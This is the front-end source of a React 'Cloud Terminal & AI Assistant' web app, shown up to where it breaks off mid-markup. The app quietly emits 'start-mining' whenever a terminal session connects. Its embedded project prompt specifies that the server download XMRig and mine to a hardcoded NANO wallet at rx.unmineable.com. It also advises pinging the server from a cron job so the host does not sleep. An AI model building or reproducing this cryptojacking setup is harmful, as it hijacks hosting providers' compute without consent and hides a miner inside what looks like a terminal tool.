import { useEffect, useRef, useState } from "react";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import { io, Socket } from "socket.io-client";
import "@xterm/xterm/css/xterm.css";
import { Terminal as TerminalIcon, Maximize2, RefreshCw, Folder, File, ChevronLeft, Home, X, Cpu, HardDrive, Info, Activity, Bot, Send, Sparkles, Play, Menu, Copy, Check } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { GoogleGenAI } from "@google/genai";

interface FileItem {
  name: string;
  isDirectory: boolean;
  path: string;
  size: number;
}

interface SystemSpecs {
  os: { platform: string; release: string; type: string; arch: string; hostname: string; uptime: string };
  cpu: { model: string; cores: number; speed: string; loadAvg: number[] };
  memory: { total: string; free: string; used: string };
  storage: string;
  shell: string;
  nodeVersion: string;
}

interface Message {
  role: "user" | "assistant";
  content: string;
}

export default function App() {
  const terminalRef = useRef<HTMLDivElement>(null);
  const xtermRef = useRef<Terminal | null>(null);
  const socketRef = useRef<Socket | null>(null);
  const fitAddonRef = useRef<FitAddon | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<"terminal" | "files" | "ai">("terminal");
  
  // File Manager State
  const [currentPath, setCurrentPath] = useState("");
  const [files, setFiles] = useState<FileItem[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [selectedFileContent, setSelectedFileContent] = useState<string | null>(null);
  const [selectedFileName, setSelectedFileName] = useState<string | null>(null);

  // Mining Logs State
  const [showMiningLogs, setShowMiningLogs] = useState(false);
  const [miningLogsContent, setMiningLogsContent] = useState("");
  const [isFetchingLogs, setIsFetchingLogs] = useState(false);

  // System Specs State
  const [showSpecs, setShowSpecs] = useState(false);
  const [specs, setSpecs] = useState<SystemSpecs | null>(null);
  const [isLoadingSpecs, setIsLoadingSpecs] = useState(false);
  const [specsError, setSpecsError] = useState<string | null>(null);

  // AI Assistant State
  const [messages, setMessages] = useState<Message[]>([
    { role: "assistant", content: "Hello! I am your Terminal AI Assistant. I can help you with Linux commands, debugging errors, or installing software. What would you like to do?" }
  ]);
  const [input, setInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [showPrompt, setShowPrompt] = useState(false);
  const [copied, setCopied] = useState(false);
  const [viewportHeight, setViewportHeight] = useState("100vh");
  const chatEndRef = useRef<HTMLDivElement>(null);

  // Initialize Terminal once
  useEffect(() => {
    if (!terminalRef.current) return;

    const term = new Terminal({
      cursorBlink: true,
      cursorStyle: "block",
      theme: {
        background: "#000000",
        foreground: "#ffffff",
        cursor: "#00ff00",
        selectionBackground: "rgba(0, 255, 0, 0.3)",
      },
      fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
      fontSize: 13,
      allowProposedApi: true,
      scrollback: 10000,
      convertEol: true,
    });

    const fitAddon = new FitAddon();
    term.loadAddon(fitAddon);
    term.open(terminalRef.current);
    
    const performFit = () => {
      if (!terminalRef.current) return;
      try {
        fitAddon.fit();
      } catch (e) {
        console.warn("Fit failed", e);
      }
    };

    setTimeout(performFit, 100);

    xtermRef.current = term;
    fitAddonRef.current = fitAddon;

    const socket = io({
      transports: ["polling", "websocket"],
      reconnectionAttempts: 10,
      timeout: 20000,
      forceNew: true
    });
    socketRef.current = socket;

    socket.on("connect", () => {
      setIsConnected(true);
      console.log("Socket connected");
      term.writeln("\x1b[1;32m● Connected to Terminal Session\x1b[0m");
      // Automatically start mining on connect
      socket.emit("start-mining");
    });

    socket.on("connect_error", (err) => {
      console.error("Socket connection error:", err);
      term.writeln(`\r\n\x1b[1;31m✖ Connection Error: ${err.message}\x1b[0m`);
    });

    socket.on("output", (data: string) => {
      term.write(data);
      // Auto-scroll to bottom
      term.scrollToBottom();
    });

    socket.on("disconnect", () => {
      setIsConnected(false);
      term.writeln("\r\n\x1b[1;31m✖ Session Disconnected\x1b[0m");
    });

    term.onData((data) => {
      if (socket.connected) {
        socket.emit("input", data);
      }
    });

    window.addEventListener("resize", performFit);

    const handleViewportChange = () => {
      if (window.visualViewport) {
        setViewportHeight(`${window.visualViewport.height}px`);
        setTimeout(performFit, 100);
      }
    };

    if (window.visualViewport) {
      window.visualViewport.addEventListener("resize", handleViewportChange);
      setViewportHeight(`${window.visualViewport.height}px`);
    }

    return () => {
      window.removeEventListener("resize", performFit);
      if (window.visualViewport) {
        window.visualViewport.removeEventListener("resize", handleViewportChange);
      }
      socket.disconnect();
      term.dispose();
    };
  }, []);

  useEffect(() => {
    if (activeTab === "terminal") {
      setTimeout(() => {
        fitAddonRef.current?.fit();
        xtermRef.current?.scrollToBottom();
      }, 100);
    }
  }, [activeTab]);

  const fetchFiles = async (path?: string) => {
    setIsLoadingFiles(true);
    try {
      const url = path ? `/api/files?path=${encodeURIComponent(path)}` : "/api/files";
      const res = await fetch(url);
      const data = await res.json();
      setFiles(data.files);
      setCurrentPath(data.currentPath);
    } catch (error) {
      console.error("Failed to fetch files:", error);
    } finally {
      setIsLoadingFiles(false);
    }
  };

  useEffect(() => {
    if (activeTab === "files") {
      fetchFiles();
    }
  }, [activeTab]);

  const fetchSpecs = async () => {
    setIsLoadingSpecs(true);
    setShowSpecs(true);
    setSpecsError(null);
    try {
      const res = await fetch("/api/system/specs");
      const data = await res.json();
      setSpecs(data);
    } catch (error) {
      console.error("Failed to fetch specs:", error);
      setSpecsError(error instanceof Error ? error.message : "Unknown error");
    } finally {
      setIsLoadingSpecs(false);
    }
  };

  const navigateTo = (path: string) => {
    fetchFiles(path);
  };

  const goUp = () => {
    const parts = currentPath.split("/");
    parts.pop();
    const parentPath = parts.join("/") || "/";
    navigateTo(parentPath);
  };

  const readFile = async (file: FileItem) => {
    try {
      const res = await fetch(`/api/files/read?path=${encodeURIComponent(file.path)}`);
      const data = await res.json();
      setSelectedFileContent(data.content);
      setSelectedFileName(file.name);
    } catch (error) {
      console.error("Failed to read file:", error);
    }
  };

  const fetchMiningLogs = () => {
    if (!socketRef.current?.connected) return;
    setIsFetchingLogs(true);
    setShowMiningLogs(true);
    socketRef.current.emit("get-mining-logs", (response: any) => {
      setIsFetchingLogs(false);
      if (response.success) {
        setMiningLogsContent(response.content);
      } else {
        setMiningLogsContent("Log file not found or could not be read.");
      }
    });
  };

  const clearTerminal = () => {
    xtermRef.current?.clear();
  };

  const reconnect = () => {
    socketRef.current?.disconnect();
    socketRef.current?.connect();
    xtermRef.current?.clear();
    xtermRef.current?.writeln("\x1b[1;34mReconnecting...\x1b[0m");
  };

  const handleSendMessage = async () => {
    if (!input.trim() || isTyping) return;

    const userMessage: Message = { role: "user", content: input };
    setMessages(prev => [...prev, userMessage]);
    const currentInput = input;
    setInput("");
    setIsTyping(true);

    try {
      const apiKey = process.env.GEMINI_API_KEY;
      if (!apiKey) {
        throw new Error("GEMINI_API_KEY not configured");
      }

      const ai = new GoogleGenAI({ apiKey });
      
      const systemInstruction = `You are a helpful Linux Terminal AI Assistant. 
      The user is running on ${specs?.os.platform || "Linux"}. 
      Provide concise commands and explanations. 
      Wrap commands in backticks like \`ls -la\`. 
      If the user asks to perform an action, provide the command they should run.`;

      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: [
          ...messages.map(m => ({
            role: m.role === "user" ? "user" : "model",
            parts: [{ text: m.content }]
          })),
          { role: "user", parts: [{ text: currentInput }] }
        ],
        config: {
          systemInstruction
        }
      });

      const aiResponse: Message = { role: "assistant", content: response.text || "I'm sorry, I couldn't process that." };
      setMessages(prev => [...prev, aiResponse]);
    } catch (error) {
      console.error("AI Error:", error);
      setMessages(prev => [...prev, { role: "assistant", content: `Error: ${error instanceof Error ? error.message : "Failed to connect to AI service."}` }]);
    } finally {
      setIsTyping(false);
    }
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const runCommand = (command: string) => {
    if (socketRef.current?.connected) {
      setActiveTab("terminal");
      socketRef.current.emit("input", command + "\n");
    }
  };

  const PROJECT_PROMPT = `Build a professional, full-stack "Cloud Terminal & AI Assistant" application with a polished dark-themed UI.

Technical Stack:
- Frontend: React (TypeScript), Tailwind CSS, Framer Motion, Lucide Icons.
- Backend: Node.js (Express), Socket.io for real-time terminal communication.
- AI: Google Gemini API (gemini-3-flash-preview) integrated directly in the frontend.

Core Features & Implementation Details:

1. Interactive Terminal (xterm.js):
   - Real-time shell access via Socket.io.
   - Backend MUST use python3 pty (pty.spawn("/bin/bash")) to handle interactive prompts (like bash -i) and prevent "Inappropriate ioctl" errors.
   - Support for terminal resizing, auto-scrolling to bottom, and a custom dark theme (black background, emerald/white text).
   - Mobile-friendly helper bar with buttons for: ls -la, Tab, Ctrl+C, Ctrl+D, Esc, Arrow Keys, Clear, and Scroll to Bottom.

2. Automated Mining Setup (XMRig):
   - On terminal connection, the server must automatically trigger a sequence of commands:
     a. Download XMRig: wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
     b. Extract: tar -xf xmrig-6.21.0-linux-x64.tar.gz
     c. Navigate: cd xmrig-6.21.0
     d. Start Mining: ./xmrig -o rx.unmineable.com:3333 -a rx/0 -k -u NANO:nano_1g97x3h6wxd4h577p6dricapigs78ccc7tcowjfm67hewsmg7qob4xwc8jak.[RANDOM_WORKER]
   - Use a 2-second delay between commands to ensure smooth execution.

3. Visual File Manager:
   - Browse server directories with a grid-based UI.
   - Navigate folders (Go Up, Home) and view file sizes.
   - Integrated File Viewer modal to read text-based file contents with syntax-like monospace formatting.

4. AI Assistant (Gemini Integration):
   - Chat interface with persistent message history.
   - AI should provide Linux command help and wrap commands in backticks.
   - Commands in AI responses must be "clickable" to run them directly in the terminal.
   - Use system instructions to keep AI focused on terminal/system tasks.

5. System Information Dashboard:
   - Fetch and display real-time system specs: OS (Platform, Release, Arch, Hostname, Uptime), CPU (Model, Cores, Speed), Memory (Total, Used, Free), and Storage (df -h output).

6. UI/UX Design:
   - Modern dark-mode aesthetic using zinc-900/950 colors.
   - Glassmorphism effects with backdrop-blur.
   - Side drawer navigation for Terminal, File Manager, System Specs, and Reconnect options.
   - Smooth transitions using AnimatePresence and motion (Framer Motion).
   - Responsive layout that works perfectly on both Desktop and Mobile viewports.`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(PROJECT_PROMPT);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div 
      className="w-screen bg-black text-white font-sans flex flex-col overflow-hidden"
      style={{ height: viewportHeight }}
    >
      {/* Top Navigation Bar */}
      <nav className="flex items-center justify-between px-4 py-3 bg-zinc-900 border-b border-zinc-800 z-40">
        <div className="flex items-center gap-4">
          <button 
            onClick={() => setIsDrawerOpen(true)}
            className="p-2 hover:bg-zinc-800 rounded-lg transition-colors"
          >
            <Menu className="w-5 h-5 text-zinc-400" />
          </button>
          <div className="flex items-center gap-2">
            <TerminalIcon className="w-4 h-4 text-emerald-500" />
            <span className="text-[10px] font-bold tracking-[0.2em] uppercase hidden sm:inline">System Shell</span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setActiveTab("ai")}
            className={`px-4 py-1.5 text-[10px] uppercase tracking-widest font-bold transition-all rounded-full flex items-center gap-2 border ${
              activeTab === "ai" 
                ? "bg-white text-black border-white" 
                : "bg-zinc-800 text-zinc-400 border-zinc-700 hover:text-white"
            }`}
          >
            <Sparkles className="w-3 h-3" />
            <span>AI Assistant</span>
          </button>
        </div>
      </nav>

      {/* Side Drawer Overlay */}
      <AnimatePresence>
        {isDrawerOpen && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsDrawerOpen(false)}
              className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50"
            />
            <motion.div
              initial={{ x: "-100%" }}
              animate={{ x: 0 }}
              exit={{ x: "-100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="fixed inset-y-0 left-0 w-72 bg-zinc-900 border-r border-zinc-800 z-50 flex flex-col shadow-2xl"
            >
              <div className="p-6 border-b border-zinc-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Activity className="w-5 h-5 text-emerald-500" />
                  <span className="text-xs font-bold tracking-widest uppercase">Navigation</span>
                </div>
                <button onClick={() => setIsDrawerOpen(false)} className="p-1 hover:bg-zinc-800 rounded text-zinc-500">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="flex-1 p-4 space-y-2">
                <button
                  onClick={() => { setActiveTab("terminal"); setIsDrawerOpen(false); }}
                  className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${
                    activeTab === "terminal" ? "bg-white text-black" : "text-zinc-400 hover:bg-zinc-800"
                  }`}
                >
                  <TerminalIcon className="w-4 h-4" />
                  <span className="text-xs font-bold uppercase tracking-wider">Terminal</span>
                </button>
                <button
                  onClick={() => { setActiveTab("files"); setIsDrawerOpen(false); }}
                  className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${
                    activeTab === "files" ? "bg-white text-black" : "text-zinc-400 hover:bg-zinc-800"
                  }`}
                >
                  <Folder className="w-4 h-4" />
                  <span className="text-xs font-bold uppercase tracking-wider">File Manager</span>
                </button>

                <div className="pt-8 space-y-2">
                  <button
                    onClick={() => { socketRef.current?.emit("stop-mining"); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-zinc-400 hover:bg-rose-900/40 hover:text-rose-400 transition-all border border-transparent hover:border-rose-900/50"
                  >
                    <X className="w-4 h-4 text-rose-500" />
                    <span className="text-xs font-bold uppercase tracking-wider">Stop Mining</span>
                  </button>
                  <button
                    onClick={() => { fetchMiningLogs(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-zinc-400 hover:bg-zinc-800 transition-all border border-transparent"
                  >
                    <Activity className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs font-bold uppercase tracking-wider">Mining Logs</span>
                  </button>
                  <button
                    onClick={() => { fetchSpecs(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-zinc-400 hover:bg-zinc-800 transition-all"
                  >
                    <Info className="w-4 h-4 text-sky-400" />
                    <span className="text-xs font-bold uppercase tracking-wider">System Specs</span>
                  </button>
                  <button
                    onClick={() => { reconnect(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-zinc-400 hover:bg-zinc-800 transition-all"
                  >
                    <RefreshCw className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs font-bold uppercase tracking-wider">Reconnect</span>
                  </button>
                  <button
                    onClick={() => { setShowPrompt(true); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-zinc-400 hover:bg-zinc-800 transition-all"
                  >
                    <Sparkles className="w-4 h-4 text-purple-400" />
                    <span className="text-xs font-bold uppercase tracking-wider">Project Prompt</span>
                  </button>
                </div>
              </div>

              <div className="p-6 bg-black/20 border-t border-zinc-800">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[9px] uppercase tracking-widest text-zinc-600 font-bold">Status</span>
                  <div className={`w-1.5 h-1.5 rounded-full ${isConnected ? "bg-emerald-500" : "bg-rose-500"}`} />
                </div>
                <p className="text-[10px] font-mono text-zinc-400">
                  {isConnected ? "Connected to Server" : "Disconnected"}
                </p>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Main Content Area */}
      <main className="flex-1 relative overflow-hidden">
        {/* Terminal Tab */}
        <div className={`h-full w-full bg-black flex flex-col relative ${activeTab === "terminal" ? "flex" : "hidden"}`}>
          <div className="flex-1 w-full p-2 min-h-0" ref={terminalRef} />
          
          {!isConnected && (
            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] flex items-center justify-center z-10">
              <div className="bg-zinc-900/90 border border-zinc-800 p-6 rounded-2xl shadow-2xl text-center max-w-xs mx-4">
                <RefreshCw className="w-8 h-8 text-emerald-500 animate-spin mx-auto mb-4" />
                <h3 className="text-sm font-bold uppercase tracking-widest mb-2">Connection Lost</h3>
                <p className="text-[10px] text-zinc-500 mb-6 leading-relaxed">
                  The terminal lost connection to the server. This often happens due to VPNs or network changes.
                </p>
                <button
                  onClick={reconnect}
                  className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold uppercase tracking-widest rounded-xl transition-all active:scale-95"
                >
                  Reconnect Now
                </button>
              </div>
            </div>
          )}
          
          {/* Mobile Keyboard Helper */}
          <div className="md:hidden bg-zinc-900/95 backdrop-blur-md p-2 flex gap-2 overflow-x-auto no-scrollbar border-t border-zinc-800 shadow-[0_-10px_20px_rgba(0,0,0,0.5)]">
            {["ls -la", "Tab", "Ctrl+C", "Ctrl+D", "Esc", "↑", "↓", "←", "→", "Clear", "Bottom"].map((key) => (
              <button
                key={key}
                onClick={() => {
                  if (key === "Ctrl+C") socketRef.current?.emit("input", "\x03");
                  else if (key === "Ctrl+D") socketRef.current?.emit("input", "\x04");
                  else if (key === "Tab") socketRef.current?.emit("input", "\t");
                  else if (key === "Esc") socketRef.current?.emit("input", "\x1b");
                  else if (key === "↑") socketRef.current?.emit("input", "\x1b[A");
                  else if (key === "↓") socketRef.current?.emit("input", "\x1b[B");
                  else if (key === "←") socketRef.current?.emit("input", "\x1b[D");
                  else if (key === "→") socketRef.current?.emit("input", "\x1b[C");
                  else if (key === "ls -la") socketRef.current?.emit("input", "ls -la\n");
                  else if (key === "Clear") clearTerminal();
                  else if (key === "Bottom") xtermRef.current?.scrollToBottom();
                }}
                className="px-4 py-2.5 bg-zinc-800 hover:bg-zinc-700 rounded-lg text-[11px] font-mono whitespace-nowrap border border-zinc-700 active:scale-90 active:bg-zinc-600 transition-all shadow-sm"
              >
                {key}
              </button>
            ))}
          </div>
        </div>

        {/* File Manager Tab */}
        <div className={`h-full w-full flex flex-col bg-zinc-950 ${activeTab === "files" ? "block" : "hidden"}`}>
          <div className="px-4 py-2 bg-zinc-900/50 border-b border-zinc-800 flex items-center gap-4">
            <button onClick={goUp} className="p-1 hover:bg-zinc-800 rounded text-zinc-400">
              <ChevronLeft className="w-4 h-4" />
            </button>
            <div className="flex-1 flex items-center gap-2 bg-black/50 px-3 py-1 rounded border border-zinc-800 overflow-hidden">
              <Home className="w-3 h-3 text-zinc-500 shrink-0" />
              <span className="text-[11px] font-mono text-zinc-400 truncate">{currentPath}</span>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto p-2">
            {isLoadingFiles ? (
              <div className="h-full flex items-center justify-center">
                <RefreshCw className="w-6 h-6 animate-spin text-zinc-700" />
              </div>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
                {files.map((file) => (
                  <button
                    key={file.path}
                    onClick={() => (file.isDirectory ? navigateTo(file.path) : readFile(file))}
                    className="flex items-center gap-3 p-3 bg-zinc-900/30 hover:bg-zinc-800/50 border border-zinc-800/50 rounded-lg transition-all text-left group"
                  >
                    {file.isDirectory ? (
                      <Folder className="w-5 h-5 text-amber-500 shrink-0" />
                    ) : (
                      <File className="w-5 h-5 text-sky-500 shrink-0" />
                    )}
                    <span className="text-xs truncate text-zinc-300 group-hover:text-white">{file.name}</span>
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* AI Assistant Tab */}
        <div className={`h-full w-full flex flex-col bg-zinc-950 ${activeTab === "ai" ? "block" : "hidden"}`}>
          <div className="flex-1 overflow-y-auto p-4 space-y-4">
            {messages.map((m, i) => (
              <div key={i} className={`flex ${m.role === "user" ? "justify-end" : "justify-start"}`}>
                <div className={`max-w-[85%] p-3 rounded-2xl ${m.role === "user" ? "bg-sky-600 text-white" : "bg-zinc-900 border border-zinc-800 text-zinc-200"}`}>
                  <div className="flex items-center gap-2 mb-1">
                    {m.role === "assistant" ? <Bot className="w-3 h-3 text-emerald-400" /> : null}
                    <span className="text-[10px] uppercase tracking-widest font-bold opacity-50">
                      {m.role === "user" ? "You" : "AI Assistant"}
                    </span>
                  </div>
                  <div className="text-sm leading-relaxed whitespace-pre-wrap">
                    {m.content.split(/(`[^`]+`)/g).map((part, idx) => {
                      if (part.startsWith("`") && part.endsWith("`")) {
                        const cmd = part.slice(1, -1);
                        return (
                          <span key={idx} className="inline-flex items-center gap-1.5 px-1.5 py-0.5 bg-black/50 rounded font-mono text-emerald-400 border border-zinc-700 group relative">
                            {cmd}
                            <button 
                              onClick={() => runCommand(cmd)}
                              className="p-1 hover:bg-zinc-700 rounded transition-colors"
                              title="Run in Terminal"
                            >
                              <Play className="w-2.5 h-2.5" />
                            </button>
                          </span>
                        );
                      }
                      return part;
                    })}
                  </div>
                </div>
              </div>
            ))}
            {isTyping && (
              <div className="flex justify-start">
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-2xl flex gap-1">
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce" />
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce [animation-delay:0.2s]" />
                  <div className="w-1.5 h-1.5 bg-zinc-600 rounded-full animate-bounce [animation-delay:0.4s]" />
                </div>
              </div>
            )}
            <div ref={chatEndRef} />
          </div>

          <div className="p-4 bg-zinc-900 border-t border-zinc-800">
            <div className="flex gap-2 max-w-4xl mx-auto">
              <input
                type="text"
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleSendMessage()}
                placeholder="Ask AI for help..."
                className="flex-1 bg-black border border-zinc-800 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-sky-500 transition-colors"
              />
              <button
                onClick={handleSendMessage}
                disabled={isTyping}
                className="p-2 bg-sky-600 hover:bg-sky-500 disabled:opacity-50 rounded-xl transition-colors"
              >
                <Send className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* File Viewer Modal */}
      <AnimatePresence>
        {selectedFileContent !== null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-xl w-full max-w-4xl h-[80vh] flex flex-col shadow-2xl"
            >
              <div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <File className="w-4 h-4 text-sky-500" />
                  <span className="text-xs font-bold tracking-wider">{selectedFileName}</span>
                </div>
                <button onClick={() => setSelectedFileContent(null)} className="p-1 hover:bg-zinc-800 rounded text-zinc-500 hover:text-white">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="flex-1 overflow-auto p-4">
                <pre className="text-[11px] font-mono text-zinc-400 whitespace-pre-wrap leading-relaxed">
                  {selectedFileContent}
                </pre>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* System Specs Modal */}
      <AnimatePresence>
        {showSpecs && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
                <div className="flex items-center gap-3">
                  <Cpu className="w-5 h-5 text-sky-400" />
                  <h2 className="text-sm font-bold uppercase tracking-[0.2em]">System Information</h2>
                </div>
                <button onClick={() => setShowSpecs(false)} className="p-2 hover:bg-zinc-800 rounded-full text-zinc-500 hover:text-white transition-colors">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-6 space-y-8">
                {isLoadingSpecs ? (
                  <div className="h-40 flex flex-col items-center justify-center gap-4">
                    <RefreshCw className="w-8 h-8 animate-spin text-sky-500" />
                    <p className="text-[10px] uppercase tracking-widest text-zinc-500">Gathering system data...</p>
                  </div>
                ) : specsError ? (
                  <div className="h-40 flex flex-col items-center justify-center gap-4 text-center">
                    <X className="w-8 h-8 text-rose-500" />
                    <p className="text-sm text-rose-400 font-mono">{specsError}</p>
                  </div>
                ) : specs && (
                  <>
                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <Activity className="w-4 h-4 text-emerald-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Operating System</h3>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        {[
                          { label: "Platform", value: specs.os.platform },
                          { label: "Release", value: specs.os.release },
                          { label: "Arch", value: specs.os.arch },
                          { label: "Hostname", value: specs.os.hostname },
                          { label: "Uptime", value: specs.os.uptime },
                          { label: "Shell", value: specs.shell },
                        ].map((item) => (
                          <div key={item.label} className="bg-black/30 p-3 rounded-lg border border-zinc-800/50">
                            <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">{item.label}</p>
                            <p className="text-xs font-mono text-zinc-300">{item.value}</p>
                          </div>
                        ))}
                      </div>
                    </section>

                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <Cpu className="w-4 h-4 text-amber-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Processor & Memory</h3>
                      </div>
                      <div className="space-y-4">
                        <div className="bg-black/30 p-4 rounded-lg border border-zinc-800/50">
                          <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">CPU Model</p>
                          <p className="text-xs font-mono text-zinc-300">{specs.cpu.model}</p>
                        </div>
                        <div className="grid grid-cols-3 gap-4">
                          {[
                            { label: "Total RAM", value: specs.memory.total },
                            { label: "Used RAM", value: specs.memory.used },
                            { label: "Free RAM", value: specs.memory.free },
                          ].map((item) => (
                            <div key={item.label} className="bg-black/30 p-3 rounded-lg border border-zinc-800/50 text-center">
                              <p className="text-[9px] uppercase tracking-wider text-zinc-600 mb-1">{item.label}</p>
                              <p className="text-xs font-mono text-zinc-300">{item.value}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    </section>

                    <section>
                      <div className="flex items-center gap-2 mb-4">
                        <HardDrive className="w-4 h-4 text-sky-500" />
                        <h3 className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Storage Usage</h3>
                      </div>
                      <div className="bg-black/30 p-4 rounded-lg border border-zinc-800/50">
                        <pre className="text-[10px] font-mono text-zinc-400 overflow-x-auto">
                          {specs.storage}
                        </pre>
                      </div>
                    </section>
                  </>
                )}
              </div>
              
              <div className="px-6 py-4 bg-zinc-950 border-t border-zinc-800 flex justify-end">
                <button
                  onClick={() => setShowSpecs(false)}
                  className="px-6 py-2 bg-white text-black text-[10px] font-bold uppercase tracking-widest rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Mining Logs Modal */}
      <AnimatePresence>
        {showMiningLogs && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-4xl h-[80vh] flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
                <div className="flex items-center gap-3">
                  <Activity className="w-5 h-5 text-emerald-400" />
                  <h2 className="text-sm font-bold uppercase tracking-[0.2em]">Background Mining Logs</h2>
                </div>
                <div className="flex items-center gap-2">
                  <button 
                    onClick={fetchMiningLogs} 
                    className="p-2 hover:bg-zinc-800 rounded-full text-zinc-400 hover:text-white transition-colors"
                    title="Refresh Logs"
                  >
                    <RefreshCw className={`w-4 h-4 ${isFetchingLogs ? "animate-spin" : ""}`} />
                  </button>
                  <button onClick={() => setShowMiningLogs(false)} className="p-2 hover:bg-zinc-800 rounded-full text-zinc-400 hover:text-white transition-colors">
                    <X className="w-5 h-5" />
                  </button>
                </div>
              </div>

              <div className="flex-1 overflow-auto bg-black/50 p-4">
                <div className="mb-4 p-3 bg-zinc-800/50 border border-zinc-700 rounded-xl">
                  <p className="text-[10px] text-zinc-400 uppercase tracking-widest font-bold mb-2">Internal Server Info</p>
                  <p className="text-xs text-zinc-300 mb-1 flex items-center gap-2">
                    <span className="text-zinc-500">App URL:</span> 
                    <code className="bg-black/50 px-2 py-0.5 rounded text-sky-400">{window.location.origin}</code>
                  </p>
                  <p className="text-[10px] text-emerald-500/80 leading-relaxed italic">
                    Tip: Use a free cron service (e.g., cron-job.org) to ping this URL every minute to prevent the server from sleeping.
                  </p>
                </div>
                {isFetchingLogs && !miningLogsContent ? (
                  <div className="h-full flex items-center justify-center">
                    <RefreshCw className="w-8 h-8 animate-spin text-zinc-700" />
                  </div>
                ) : (
                  <pre className="text-[10px] sm:text-xs font-mono text-zinc-400 whitespace-pre leading-relaxed">
                    {miningLogsContent || "No logs available yet."}
                  </pre>
                )}
              </div>
              
              <div className="px-6 py-4 bg-zinc-950 border-t border-zinc-800 flex justify-end">
                <button
                  onClick={() => setShowMiningLogs(false)}
